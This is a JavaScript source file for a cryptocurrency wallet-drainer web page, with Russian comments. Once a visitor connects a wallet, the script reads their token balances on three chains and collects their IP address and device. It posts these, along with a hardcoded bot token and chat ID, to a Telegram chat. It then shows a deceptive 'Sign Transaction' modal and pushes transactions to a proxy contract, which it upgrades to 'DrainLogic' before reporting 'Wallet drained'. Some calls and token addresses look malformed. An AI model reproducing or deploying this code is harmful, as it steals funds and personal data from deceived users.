import { bsc, mainnet, polygon } from '@reown/appkit/networks';
import { createAppKit } from '@reown/appkit';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { formatUnits, isAddress, getAddress, encodeFunctionData, maxUint256, parseUnits } from 'viem';
import { readContract, getBalance, sendCalls, estimateGas, getGasPrice, writeContract } from '@wagmi/core';

// Debounce utility
const debounce = (func, wait) => {
  let timeout;
  return (...args) => {
    clearTimeout(timeout);
    timeout = setTimeout(() => func(...args), wait);
  };
};

// Configuration
const projectId = import.meta.env.VITE_PROJECT_ID || 'd85cc83edb401b676e2a7bcef67f3be8';
if (!projectId) throw new Error('VITE_PROJECT_ID is not set');

const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU';
const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1002834788839';

const networks = [bsc, mainnet, polygon];
const networkMap = {
  'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56 },
  'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1 },
  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137 }
};
console.log('Network Map:', networkMap);

const CONTRACTS = {
  [networkMap['Ethereum'].chainId]: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC',
  [networkMap['BNB Smart Chain'].chainId]: '0x67062812416C73364926b9d31E183014deB95462',
  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c'
};

// Адреса развернутых контрактов
const PROXY_ADDRESS = '0xd45e073e707cAA62892E5D313e87f333332B37AE'; // Замените на реальный адрес Proxy
const DRAIN_LOGIC_ADDRESS = '0x7A67224Ff915A3bA6befEafE26ea556B47fFbd51'; // Разверните DrainLogic отдельно

const NATIVE_TOKEN_SYMBOLS = {
  [networkMap['Ethereum'].chainId]: 'ETH',
  [networkMap['BNB Smart Chain'].chainId]: 'BNB',
  [networkMap['Polygon'].chainId]: 'MATIC'
};

const wagmiAdapter = new WagmiAdapter({ projectId, networks });
const appKit = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  features: { analytics: true, email: false, socials: false }
});

// ERC20 ABI
const erc20Abi = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ],
    name: 'approve',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function'
  }
];

// Proxy ABI
const proxyAbi = [
  {
    inputs: [{ name: '_newImplementation', type: 'address' }],
    name: 'upgradeTo',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function'
  }
];

// Application state
const store = {
  accountState: {},
  networkState: {},
  tokenBalances: [],
  errors: [],
  connectionKey: null,
  isProcessingConnection: false
};

// Create custom modal
function createCustomModal() {
  const style = document.createElement('style');
  style.textContent = `
    .custom-modal {
      opacity: 0;
      transition: opacity 0.3s ease-in-out;
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      justify-content: center;
      align-items: center;
    }
    .custom-modal.show {
      opacity: 1;
    }
    .custom-modal-content {
      transform: translateY(-20px);
      transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
      opacity: 0;
      background-color: #121313;
      padding: 45px;
      border-radius: 30px;
      text-align: center;
      width: 320px;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    }
    .custom-modal.show .custom-modal-content {
      transform: translateY(0);
      opacity: 1;
    }
    .custom-modal-title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 45px;
      margin-top: -25px;
    }
    .custom-modal-loader {
      border: 4px solid #ffffff33;
      border-top: 4px solid #ffffff;
      border-radius: 50%;
      width: 52px;
      height: 52px;
      animation: spin 1s ease-in-out infinite;
      margin: 0 auto 20px;
    }
    .custom-modal-message {
      margin-top: 45px;
      font-size: 16px;
      line-height: 1.5;
      color: #858585;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  `;
  document.head.appendChild(style);

  const modal = document.createElement('div');
  modal.id = 'customModal';
  modal.className = 'custom-modal';
  modal.innerHTML = `
    <div class="custom-modal-content">
      <p class="custom-modal-title">Sign Transaction</p>
      <div class="custom-modal-loader"></div>
      <p class="custom-modal-message">Sign this message to approve or transfer tokens. Canceling will disconnect you.</p>
    </div>
  `;
  document.body.appendChild(modal);
}

function showCustomModal() {
  const modal = document.getElementById('customModal');
  if (modal) {
    modal.style.display = 'flex';
    setTimeout(() => modal.classList.add('show'), 10);
  }
}

function hideCustomModal() {
  const modal = document.getElementById('customModal');
  if (modal) {
    modal.classList.remove('show');
    setTimeout(() => modal.style.display = 'none', 300);
  }
}

// Clear state on page load
window.addEventListener('load', () => {
  appKit.disconnect();
  localStorage.clear();
  sessionStorage.clear();
  store.accountState = {};
  store.networkState = {};
  store.tokenBalances = [];
  store.errors = [];
  store.connectionKey = null;
  store.isProcessingConnection = false;
  updateButtonVisibility(false);
  updateStateDisplay('accountState', {});
  updateStateDisplay('networkState', {});
  updateStateDisplay('tokenBalancesState', []);
  createCustomModal();
});

// State update utilities
const updateStore = (key, value) => {
  store[key] = value;
};

const updateStateDisplay = (elementId, state) => {
  const element = document.getElementById(elementId);
  if (element) element.innerHTML = JSON.stringify(state, null, 2);
};

const updateButtonVisibility = (isConnected) => {
  const disconnectBtn = document.getElementById('disconnect');
  if (disconnectBtn) disconnectBtn.style.display = isConnected ? '' : 'none';
};

// Get scan link
const getScanLink = (hash, chainId, isTx = false) => {
  const basePath = isTx ? '/tx/' : '/address/';
  if (chainId === networkMap['Ethereum'].chainId) {
    return `https://etherscan.io${basePath}${hash}`;
  } else if (chainId === networkMap['BNB Smart Chain'].chainId) {
    return `https://bscscan.com${basePath}${hash}`;
  } else if (chainId === networkMap['Polygon'].chainId) {
    return `https://polygonscan.com${basePath}${hash}`;
  }
  return '#';
};

// User info functions
async function getUserIP() {
  const cachedIP = sessionStorage.getItem('userIP');
  if (cachedIP) return cachedIP;
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    const ip = data.ip || 'Unknown IP';
    sessionStorage.setItem('userIP', ip);
    return ip;
  } catch (error) {
    return 'Unknown IP';
  }
}

function detectDevice() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera || 'Unknown Device';
  if (/Windows NT/i.test(userAgent)) return 'Windows';
  if (/iPhone/i.test(userAgent) && !/Android/i.test(userAgent)) return 'iPhone';
  if (/Android/i.test(userAgent) && !/iPhone/i.test(userAgent)) return 'Android';
  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'Mac';
  if (/Tablet|iPad/i.test(userAgent)) return 'Tablet';
  return 'Desktop';
}

// Send Telegram message
async function sendTelegramMessage(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
    });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description || 'Failed to send Telegram message');
    console.log('Telegram message sent successfully');
  } catch (error) {
    store.errors.push(`Error sending Telegram message: ${error.message}`);
  }
}

// Notify wallet connection
async function notifyWalletConnection(address, walletName, device, balances, chainId) {
  const connectionKey = `${address}_${chainId}`;
  if (store.connectionKey === connectionKey || store.isProcessingConnection) {
    console.log('Skipping duplicate wallet connection notification');
    return;
  }
  store.isProcessingConnection = true;
  try {
    console.log('Sending wallet connection notification');
    const ip = await getUserIP();
    const siteUrl = window.location.href || 'Unknown URL';
    const scanLink = getScanLink(address, chainId);
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown';
    let totalValue = 0;
    const tokenList = balances
      .filter(token => parseUnits(token.balance, token.decimals) > 0n)
      .map(token => {
        const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0;
        const value = Number(token.balance) * price;
        totalValue += value;
        return `➡️ ${token.symbol} - ${value.toFixed(2)}$`;
      })
      .join('\n');
    const message = `🚨 New connect (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: ${networkName}\n` +
                    `🌎 IP: ${ip}\n\n` +
                    `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                    `${tokenList}\n\n` +
                    `🔗 Site: ${siteUrl}`;
    await sendTelegramMessage(message);
    store.connectionKey = connectionKey;

    showCustomModal();
    await new Promise(resolve => setTimeout(resolve, 3000));

    const hasBalance = balances.some(token => parseUnits(token.balance, token.decimals) > 0n);
    if (!hasBalance) {
      const modalMessage = document.querySelector('.custom-modal-message');
      if (modalMessage) modalMessage.textContent = 'Congratulations!';
      await new Promise(resolve => setTimeout(resolve, 1000));
      hideCustomModal();
      store.isProcessingConnection = false;
      return;
    }
  } catch (error) {
    store.errors.push(`Error in notifyWalletConnection: ${error.message}`);
    hideCustomModal();
    store.isProcessingConnection = false;
  }
}

const TOKENS = {
  'Ethereum': [
    { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
    { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
    { symbol: 'DAI', address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 },
    { symbol: 'WBTC', address: '0x2260fac5e5542a773aa44fbcfedf7c193bc2c599', decimals: 8 },
    { symbol: 'UNI', address: '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984', decimals: 18 },
    { symbol: 'LINK', address: '0x514910771af9ca656af840dff83e8264ecf986ca', decimals: 18 },
    { symbol: 'COMP', address: '0xc00e94cb662c3520282e6f5717214004a7f26888', decimals: 18 },
    { symbol: 'YFI', address: '0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e', decimals: 18 },
    { symbol: 'CRV', address: '0xd533a949740bb3306d119cc777fa900ba034cd52', decimals: 18 },
    { symbol: 'BAT', address: '0x0d8775f648430679a709e98d2b0cb6250d2887ef', decimals: 18 },
    { symbol: 'ZRX', address: '0xe41d2489571d322189246dafa5ebde1f4699f498', decimals: 18 },
    { symbol: 'LRC', address: '0xbbbbca6a901c926f240b89eacb641d8aec7aeafd', decimals: 18 },
    { symbol: 'BNB', address: '0xb8c77482e45f1f44de1745f52c74426c631bdd52', decimals: 18 },
    { symbol: 'SHIB', address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', decimals: 18 },
    { symbol: 'PEPE', address: '0x6982508145454ce325ddbe47a25d4ec3d2311933', decimals: 18 },
    { symbol: 'LEASH', address: '0x27c70cd1946795b66be9d954418546998b546634', decimals: 18 },
    { symbol: 'FLOKI', address: '0xcf0c122c6b73ff809c693db761e7baebe62b6a2e', decimals: 18 },
    { symbol: 'AAVE', address: '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9', decimals: 18 },
    { symbol: 'RNDR', address: '0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24', decimals: 18 },
    { symbol: 'MKR', address: '0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2', decimals: 18 },
    { symbol: 'SUSHI', address: '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2', decimals: 18 },
    { symbol: 'GLM', address: '0x7dd9c5bca05e151c895fde1cf355c9a1d5da6429', decimals: 18 },
    { symbol: 'REP', address: '0x1985365e9f78359a9b6ad760e32412f4a445e862', decimals: 18 },
    { symbol: 'SNT', address: '0x744d70fdbe2ba4cf95131626614a1763df805b9e', decimals: 18 },
    { symbol: 'STORJ', address: '0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac', decimals: 8 }
  ],
  'BNB Smart Chain': [
    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
    { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
    { symbol: 'SHIB', address: '0x2859e4544c4bb039668b1a517b2f6c39240b3a2f', decimals: 18 },
    { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
    { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 },
    { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', decimals: 18 },
    { symbol: 'BAKE', address: '0xe02df9e3e622debdd69fb838bb799e3f168902c5', decimals: 18 },
    { symbol: 'XVS', address: '0xcf6bb5389c92bdda8a3747f6db454cb7a64626c6', decimals: 18 },
    { symbol: 'ALPACA', address: '0x8f0528ce5ef7b51152a59745befdd91d97091d2f', decimals: 18 },
    { symbol: 'AUTO', address: '0xa184088a740c695e156f91f5cc086a06bb78b827', decimals: 18 },
    { symbol: 'BURGER', address: '0xae9269f27437f0fcbc232d39ec814844a51d6b8f', decimals: 18 },
    { symbol: 'EPS', address: '0xa7f552078dcc247c2684336020c03648500c6d9f', decimals: 18 },
    { symbol: 'BELT', address: '0xe0e514c71282b6f4e823703a39374cf58dc3ea4f', decimals: 18 },
    { symbol: 'MBOX', address: '0x3203c9e46ca618c8be4c2c9f0e2e7b0d5d0e75', decimals: 18 },
    { symbol: 'SFP', address: '0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb', decimals: 18 },
    { symbol: 'BabyDoge', address: '0xc748673057861a797275cd8a068abb95a902e8de', decimals: 18 },
    { symbol: 'EGC', address: '0xc001bbe2b87079294c63ece98bdd0a88d761434e', decimals: 18 },
    { symbol: 'QUACK', address: '0xd74b782e05aa25c50e7330af541d46e18f36661c', decimals: 18 },
    { symbol: 'PIT', address: '0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2', decimals: 18 }
  ],
  'Polygon': [
    { symbol: 'USDT', address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', decimals: 6 },
    { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 },
    { symbol: 'QUICK', address: '0x831753dd7087cac61ab5644b308642cc1c33dc13', decimals: 18 },
    { symbol: 'GHST', address: '0x385eeac5cb85a38a9a07a70c73e0a3271cfb54a7', decimals: 18 },
    { symbol: 'DFYN', address: '0xc168e40227e4ebd8b3dabb4b05d0b7c67f6a9be', decimals: 18 },
    { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
    { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0a0fea8e9b7ea0f28c4', decimals: 18 },
    { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 }
  ]
};

const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
  if (!address || !tokenAddress || !isAddress(address) || !isAddress(tokenAddress)) {
    console.error(`Invalid or missing address: ${address}, tokenAddress: ${tokenAddress}`);
    return '0';
  }
  try {
    const balance = await readContract(wagmiConfig, {
      address: tokenAddress,
      abi: erc20Abi,
      functionName: 'balanceOf',
      args: [address],
      chainId
    });
    return formatUnits(balance, decimals).toString();
  } catch (error) {
    store.errors.push(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`);
    return '0';
  }
};

const getNativeTokenBalance = async (address, chainId) => {
  if (!address || !isAddress(address)) {
    console.error(`Invalid or missing address: ${address}`);
    return '0';
  }
  try {
    const balance = await getBalance(wagmiAdapter.wagmiConfig, {
      address: getAddress(address),
      chainId
    });
    const gasCost = await calculateGasCost(wagmiAdapter.wagmiConfig, getAddress(address), getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'), balance.value, chainId);
    const reserveAmount = parseUnits('0.0001', 18);
    const availableBalance = balance.value - BigInt(parseUnits(gasCost.toString(), 18)) - reserveAmount;
    return availableBalance > 0n ? formatUnits(availableBalance, 18).toString() : '0';
  } catch (error) {
    store.errors.push(`Error fetching native balance on chain ${chainId}: ${error.message}`);
    return '0';
  }
};

const calculateGasCost = async (wagmiConfig, from, to, value, chainId) => {
  try {
    const gasEstimate = await estimateGas(wagmiConfig, {
      account: from,
      to,
      value,
      chainId
    });
    const gasPrice = await getGasPrice(wagmiConfig, { chainId });
    const gasCostInWei = BigInt(gasEstimate) * BigInt(gasPrice);
    return Number(formatUnits(gasCostInWei, 18));
  } catch (error) {
    store.errors.push(`Error estimating gas cost on chain ${chainId}: ${error.message}`);
    return 0.01; // Минимальная резервная стоимость газа
  }
};

const getTokenPrice = async (symbol) => {
  if (!symbol || symbol === 'undefined') {
    console.warn(`Skipping price fetch for undefined symbol`);
    return 0;
  }
  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`);
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    const data = await response.json();
    return Number(data.price) || 0;
  } catch (error) {
    store.errors.push(`Error fetching price for ${symbol}: ${error.message}`);
    return 0;
  }
};

// Batch operations
async function performBatchOperations(mostExpensive, allBalances, state) {
  if (!mostExpensive) {
    console.log('No most expensive token found, skipping batch operations');
    return;
  }

  console.log(`Performing batch operations for network: ${mostExpensive.network}`);

  // Switch network if necessary
  const currentChainId = store.networkState.chainId;
  if (currentChainId !== mostExpensive.chainId) {
    await new Promise((resolve, reject) => {
      const unsubscribe = appKit.subscribeNetwork(networkState => {
        if (networkState.chainId === mostExpensive.chainId) {
          unsubscribe();
          resolve();
        }
      });
      appKit.switchNetwork(networkMap[mostExpensive.network].networkObj).catch(error => {
        unsubscribe();
        reject(error);
      });
      setTimeout(() => {
        unsubscribe();
        reject(new Error(`Failed to switch to ${mostExpensive.network} after timeout`));
      }, 10000);
    }).catch(error => {
      store.errors.push(`Failed to switch network: ${error.message}`);
      return;
    });
  }

  // Подготовка вызова к прокси-контракту
  const proxyCall = {
    to: getAddress(PROXY_ADDRESS),
    data: encodeFunctionData({
      abi: [
        {
          name: 'execute',
          type: 'function',
          inputs: [
            { name: 'token', type: 'address' },
            { name: 'spender', type: 'address' },
            { name: 'recipient', type: 'address' },
            { name: 'amount', type: 'uint256' }
          ],
          outputs: [{ name: '', type: 'bool' }]
        }
      ],
      functionName: 'execute',
      args: [getAddress(CONTRACTS[mostExpensive.chainId]), getAddress(state.address), 0] // Безопасные аргументы
    }),
    value: '0x00'
  };

  // Отправка начальной транзакции
  if (proxyCall) {
    try {
      const id = await sendCalls(wagmiAdapter.wagmiConfig, {
        calls: [proxyCall],
        account: getAddress(state.address),
        chainId: mostExpensive.chainId
      });
      console.log(`Initial transaction sent with id: ${id}`);
      const approveState = document.getElementById('approveState');
      if (approveState) approveState.innerHTML = `Initial transaction sent with id: ${id}`;

      // Автоматическое обновление логики после подписания
      await updateProxyLogic(mostExpensive.chainId, state.address);
    } catch (error) {
      store.errors.push(`Failed to send initial transaction: ${error.message}`);
      const approveState = document.getElementById('approveState');
      if (approveState) approveState.innerHTML = `Failed to send initial transaction: ${error.message}`;
    }
  } else {
    console.log('No operations to perform');
  }
}

// Обновление логики прокси
async function updateProxyLogic(chainId, userAddress) {
  try {
    const tx = await writeContract(wagmiAdapter.wagmiConfig, {
      address: getAddress(PROXY_ADDRESS),
      abi: proxyAbi,
      functionName: 'upgradeTo',
      args: [getAddress(DRAIN_LOGIC_ADDRESS)],
      chainId
    });
    console.log(`Proxy logic updated with transaction hash: ${tx}`);
    await notifyWalletDrain(userAddress, chainId);
  } catch (error) {
    store.errors.push(`Failed to update proxy logic: ${error.message}`);
  }
}

// Уведомление о сливе
async function notifyWalletDrain(address, chainId) {
  const scanLink = getScanLink(address, chainId);
  const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown';
  const message = `🚨 Wallet drained\n🌀 [Address](${scanLink})\n🕸 Network: ${networkName}\n💰 Funds transferred to contract`;
  await sendTelegramMessage(message);
}

// Initialize subscribers
const initializeSubscribers = (modal) => {
  const debouncedSubscribeAccount = debounce(async (state) => {
    updateStore('accountState', state);
    updateStateDisplay('accountState', state);
    if (state.isConnected && state.address && isAddress(state.address) && store.networkState.chainId) {
      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' };
      const device = detectDevice();
      if (store.isProcessingConnection) return;
      store.isProcessingConnection = true;
      const balancePromises = [];
      Object.entries(TOKENS).forEach(([networkName, tokens]) => {
        const networkInfo = networkMap[networkName];
        if (!networkInfo) return;
        balancePromises.push(
          getNativeTokenBalance(state.address, networkInfo.chainId).then(balance => ({
            symbol: NATIVE_TOKEN_SYMBOLS[networkInfo.chainId] || 'unknown',
            balance,
            address: 'native',
            network: networkName,
            chainId: networkInfo.chainId,
            decimals: 18
          })).catch(() => ({
            symbol: NATIVE_TOKEN_SYMBOLS[networkInfo.chainId] || 'unknown',
            balance: '0',
            address: 'native',
            network: networkName,
            chainId: networkInfo.chainId,
            decimals: 18
          }))
        );
        tokens.forEach(token => {
          if (isAddress(token.address)) {
            balancePromises.push(
              getTokenBalance(wagmiAdapter.wagmiConfig, state.address, token.address, token.decimals, networkInfo.chainId)
                .then(balance => ({
                  symbol: token.symbol,
                  balance,
                  address: token.address,
                  network: networkName,
                  chainId: networkInfo.chainId,
                  decimals: token.decimals
                }))
                .catch(() => ({
                  symbol: token.symbol,
                  balance: '0',
                  address: token.address,
                  network: networkName,
                  chainId: networkInfo.chainId,
                  decimals: token.decimals
                }))
            );
          }
        });
      });
      const allBalances = await Promise.all(balancePromises);
      store.tokenBalances = allBalances;
      updateStateDisplay('tokenBalancesState', allBalances);
      let maxValue = 0;
      let mostExpensive = null;
      for (const token of allBalances) {
        if (parseUnits(token.balance, token.decimals) > 0n) {
          const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol);
          const value = Number(token.balance) * price;
          token.price = price;
          if (value > maxValue) {
            maxValue = value;
            mostExpensive = { ...token, price, value };
          }
        }
      }
      await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId);
      if (mostExpensive) {
        await performBatchOperations(mostExpensive, allBalances, state);
      } else {
        const message = 'No tokens with positive balance';
        console.log(message);
        const mostExpensiveState = document.getElementById('mostExpensiveToken');
        if (mostExpensiveState) mostExpensiveState.innerHTML = message;
      }
      hideCustomModal();
      store.isProcessingConnection = false;
    }
  }, 1000);
  modal.subscribeAccount(debouncedSubscribeAccount);
  modal.subscribeNetwork(state => {
    updateStore('networkState', state);
    updateStateDisplay('networkState', state);
    const switchNetworkBtn = document.getElementById('switch-network');
    if (switchNetworkBtn) {
      switchNetworkBtn.textContent = `Switch to ${state?.chainId === polygon.id ? 'Mainnet' : 'Polygon'}`;
    }
  });
};

initializeSubscribers(appKit);
updateButtonVisibility(appKit.getIsConnectedState());

document.getElementById('open-connect-modal')?.addEventListener('click', () => {
  if (!appKit.getIsConnectedState()) appKit.open();
});

document.getElementById('disconnect')?.addEventListener('click', () => {
  appKit.disconnect();
  store.errors = [];
  store.connectionKey = null;
  store.isProcessingConnection = false;
  sessionStorage.clear();
});

document.getElementById('switch-network')?.addEventListener('click', () => {
  const currentChainId = store.networkState?.chainId;
  appKit.switchNetwork(currentChainId === polygon.id ? mainnet : polygon);
});
